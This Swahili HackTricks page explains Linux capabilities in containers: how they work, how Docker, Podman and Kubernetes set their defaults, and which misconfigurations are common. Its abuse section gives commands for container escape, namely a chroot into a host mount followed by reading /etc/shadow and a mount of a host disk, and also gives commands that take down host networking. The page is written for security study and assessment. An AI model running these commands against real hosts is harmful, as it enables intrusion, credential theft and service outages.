# Uwezo za Linux katika Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

Uwezo za Linux ni mojawapo ya vipengele muhimu zaidi vya usalama wa container kwa sababu zinajibu swali nyembamba lakini la msingi: **what does "root" really mean inside a container?** Kwenye mfumo wa kawaida wa Linux, UID 0 kihistoria ilimaanisha seti pana ya vibali. Katika kernels za kisasa, kibali hicho kimegawanywa kuwa vitengo vidogo vinavyoitwa capabilities. Mchakato unaweza kuendesha kama root na bado kukosa shughuli nyingi zenye nguvu ikiwa capabilities husika zimeondolewa.

Containers zinategemea tofauti hii kwa kiasi kikubwa. Mizigo mingi ya kazi bado inaanzishwa kama UID 0 ndani ya container kwa sababu za muingiliano au urahisi. Bila kuondoa capabilities, hilo lisingekuwa salama kabisa. Kwa kuondoa capabilities, mchakato wa root uliowekwa ndani ya container bado unaweza kufanya kazi nyingi za kawaida ndani ya container huku ukikataliwa fukuzo za kernel zenye ulinzi zaidi. Ndiyo sababu shell ya container inayosema `uid=0(root)` haiwezi moja kwa moja kumaanisha "host root" au hata "broad kernel privilege". Seti za capabilities zinaamua thamani ya utambulisho huo wa root.

Kwa rejea kamili ya capability za Linux na mifano mingi ya matumizi mabaya, angalia:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Operesheni

Capabilities zinafuatiliwa katika seti kadhaa, zikiwemo permitted, effective, inheritable, ambient, na bounding sets. Kwa tathmini nyingi za container, semantics maalum za kernel za kila seti si muhimu mara moja kama swali la vitendo la mwisho: **which privileged operations can this process successfully perform right now, and which future privilege gains are still possible?**

Sababu muhimu ni kwamba mbinu nyingi za breakout kwa kweli ni matatizo ya capability yaliyofichwa kama matatizo ya container. Workload yenye `CAP_SYS_ADMIN` inaweza kufikia idadi kubwa ya uwezo wa kernel ambao mchakato wa root wa container kawaida haupaswi kugusa. Workload yenye `CAP_NET_ADMIN` inakuwa hatari zaidi ikiwa pia inashiriki host network namespace. Workload yenye `CAP_SYS_PTRACE` inakuwa ya kuvutia zaidi ikiwa inaweza kuona mchakato za host kupitia host PID sharing. Katika Docker au Podman hilo linaweza kuonekana kama `--pid=host`; katika Kubernetes kawaida huonekana kama `hostPID: true`.

Kwa maneno mengine, seti ya capabilities haiwezi kutathminiwa kwa kuachana. Inapaswa kusomwa pamoja na namespaces, seccomp, na MAC policy.

## Maabara

Njia moja ya moja-kwa-moja ya kukagua capabilities ndani ya container ni:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Unaweza pia kulinganisha container yenye vikwazo vingi zaidi na ile ambayo imeongezewa capabilities zote:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ili kuona athari ya nyongeza ndogo, jaribu kuondoa kila kitu kisha urejeshe capability moja tu:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Majaribio madogo haya yanaonyesha kwamba runtime sio tu kubadili boolean inayoitwa "privileged". Inaunda uso halisi wa ruhusa unaopatikana kwa mchakato.

## Uwezo Zenye Hatari Kuu

Ingawa uwezo mwingi unaweza kuwa muhimu kulingana na lengo, machache mara kwa mara yanahusiana na uchambuzi wa kuondoka kwa container.

**`CAP_SYS_ADMIN`** ni ile ambayo walinzi wanapaswa kuiangalia kwa shaka kubwa zaidi. Mara nyingi huwekwa kama "the new root" kwa sababu inafungua kiasi kikubwa cha functionality, ikiwa ni pamoja na mount-related operations, namespace-sensitive behavior, na njia nyingi za kernel ambazo hazipaswi kufichuliwa kihalisi kwa containers. Ikiwa container ina `CAP_SYS_ADMIN`, seccomp dhaifu, na hakuna kifungio kali cha MAC, njia nyingi za classic breakout zinakuwa halisi zaidi.

**`CAP_SYS_PTRACE`** inahusu wakati kuna uonekano wa mchakato, hasa ikiwa PID namespace imegawanywa na host au na workloads za jirani zenye kuvutia. Inaweza kugeuza uonekano kuwa kuingilia.

**`CAP_NET_ADMIN`** na **`CAP_NET_RAW`** ni muhimu katika mazingira yanayolenga mtandao. Kwenye mtandao wa bridge uliotengwa zinaweza kuwa tayari hatari; kwenye namespace ya mtandao ya host iliyogawanywa ni mbaya zaidi kwa sababu workload inaweza kuwa na uwezo wa kurekebisha host networking, sniff, spoof, au kuingilia mtiririko wa trafiki za ndani.

**`CAP_SYS_MODULE`** kawaida huwa hatari kabisa katika mazingira ya rootful kwa sababu loading kernel modules ni udhibiti wa host-kernel kwa vitendo. Haipaswi kuonekana karibu kamwe katika workload ya container ya madhumuni ya jumla.

## Matumizi ya runtime

Docker, Podman, containerd-based stacks, na CRI-O zote zinatumia capability controls, lakini defaults na management interfaces zinatofautiana. Docker huonyesha hizo moja kwa moja kupitia flags kama `--cap-drop` na `--cap-add`. Podman huonyesha controls sawa na mara nyingi inafaidika na rootless execution kama safu ya ziada ya usalama. Kubernetes inaonyesha kuongeza na kuondoa uwezo kupitia Pod au container `securityContext`. Mazingira ya system-container kama LXC/Incus pia hutegemea capability control, lakini uunganishaji mpana wa host wa mifumo hiyo mara nyingi huwavuta operator kupunguza defaults kwa nguvu zaidi kuliko wangekuwa katika mazingira ya app-container.

Kanuni ile ile inatumika kwa wote: uwezo unaowezekana kiteknolojia kupewa si lazima uwe ule unaopaswa kupewa. Matukio mengi ya dunia halisi huanza wakati operator anongeza uwezo kwa sababu tu workload ilishindwa chini ya usanidi mkali na timu ilihitaji suluhisho la haraka.

## Hitilafu za usanidi

Kosa lililo dhahiri zaidi ni **`--cap-add=ALL`** katika CLIs za mtindo wa Docker/Podman, lakini sio pekee. Kwa vitendo, tatizo linalotokea mara nyingi ni kutoa uwezo mmoja au wawili wenye nguvu sana, hasa `CAP_SYS_ADMIN`, ili "make the application work" bila pia kuelewa implikesheni za namespace, seccomp, na mount. Njia nyingine ya kushindwa mara kwa mara ni kuunganisha uwezo wa ziada na host namespace sharing. Katika Docker au Podman hii inaweza kuonekana kama `--pid=host`, `--network=host`, au `--userns=host`; katika Kubernetes kufichuliwa sawa kwa kawaida kunaonekana kupitia mipangilio ya workload kama `hostPID: true` au `hostNetwork: true`. Kila moja ya mchanganyiko hayo hubadilisha kile uwezo unaweza kuathiri kwa kweli.

Pia ni kawaida kuona wasimamizi wakidhani kwa sababu workload si kabisa `--privileged`, bado imewekewa vizingiti vinavyomaanisha. Wakati mwingine hilo ni kweli, lakini wakati mwingine mtazamo wa ufanisi tayari uko karibu vya kutosha na `--privileged` kiasi kwamba tofauti haibaki na umuhimu kiutendaji.

## Matumizi Mabaya

Hatua ya kwanza ya vitendo ni kuorodhesha seti ya uwezo inayofanya kazi na mara moja kujaribu vitendo maalum vya uwezo ambavyo vitakuwa muhimu kwa kuondoka au upatikanaji wa taarifa za host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Ikiwa `CAP_SYS_ADMIN` upo, jaribu kwanza matumizi mabaya yanayotegemea mount na ufikiaji wa filesystem ya host, kwa sababu hiki ni mojawapo ya njia za kawaida za kuwezesha breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Ikiwa `CAP_SYS_PTRACE` ipo na container inaweza kuona michakato ya kuvutia, thibitisha ikiwa capability inaweza kubadilishwa kuwa process inspection:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Ikiwa `CAP_NET_ADMIN` au `CAP_NET_RAW` zipo, jaribu kama workload inaweza kubadilisha stack ya mtandao inayoonekana au angalau kukusanya taarifa muhimu za mtandao:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wakati jaribio la capability linafanikiwa, linganisha na hali ya namespace. Capability inayotarajiwa kuwa hatari tu katika namespace iliyotengwa inaweza mara moja kuwa escape au host-recon primitive wakati container pia inashiriki host PID, host network, au host mounts.

### Mfano Kamili: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Ikiwa container ina `CAP_SYS_ADMIN` na writable bind mount ya host filesystem kama `/host`, njia ya escape mara nyingi ni rahisi:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Ikiwa `chroot` itafanikiwa, amri sasa zinaendesha katika muktadha wa mfumo wa faili wa mizizi wa mwenyeji:
```bash
id
hostname
cat /etc/shadow | head
```
Ikiwa `chroot` haipatikani, matokeo yale yale mara nyingi yanaweza kupatikana kwa kuendesha binary kupitia mti uliounganishwa:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Mfano Kamili: `CAP_SYS_ADMIN` + Ufikiaji wa Kifaa

Ikiwa block device kutoka kwa host imefunuliwa, `CAP_SYS_ADMIN` inaweza kuibadilisha kuwa ufikiaji wa moja kwa moja wa sistema ya faili ya host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Mfano Kamili: `CAP_NET_ADMIN` + Host Networking

Mchanganyiko huu si kila wakati huleta host root moja kwa moja, lakini unaweza kusanidi upya kabisa host network stack:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Hii inaweza kuwezesha denial of service, kukamata trafiki, au kupata huduma ambazo hapo awali zilichujwa.

## Ukaguzi

Lengo la ukaguzi wa capabilities sio tu kuonyesha thamani ghafi, bali kuelewa kama mchakato una vibali vya kutosha vya kufanya namespace na mount yake ya sasa kuwa hatari.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Kinachovutia hapa:

- `capsh --print` ni njia rahisi zaidi ya kutambua capabilities zenye hatari kubwa kama `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, au `cap_sys_module`.
- Mstari wa `CapEff` katika `/proc/self/status` unakuambia ni nini kinachofanya kazi sasa, si tu kile kinachoweza kupatikana katika seti nyingine.
- Dump ya capabilities inakuwa muhimu zaidi ikiwa container pia inashiriki host PID, network, au user namespaces, au ikiwa ina writable host mounts.

Baada ya kukusanya taarifa mbichi za capabilities, hatua inayofuata ni tafsiri. Jiulize kama mchakato ni root, kama user namespaces ziko hai, kama host namespaces zinashirikiwa, kama seccomp iko enforcing, na kama AppArmor au SELinux bado zinaizuia mchakato. Seti ya capabilities yenyewe ni sehemu tu ya hadithi, lakini mara nyingi ndiyo sehemu inayofafanua kwa nini breakout ya container moja inafanya kazi na nyingine inashindwa kwa chanzo kinachoonekana kama hicho.

## Chaguo-msingi za Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhaifu wa kawaida kwa mkono |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker keeps a default allowlist of capabilities and drops the rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers are unprivileged by default and use a reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | The effective set depends on the runtime plus the Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Kwa Kubernetes, jambo muhimu ni kwamba API haiainishi seti moja ya chaguo-msingi za capabilities kwa kila mazingira. Ikiwa Pod haitoi au kuondoa capabilities, mzigo wa kazi unarithi chaguo-msingi la runtime kwa node hiyo.
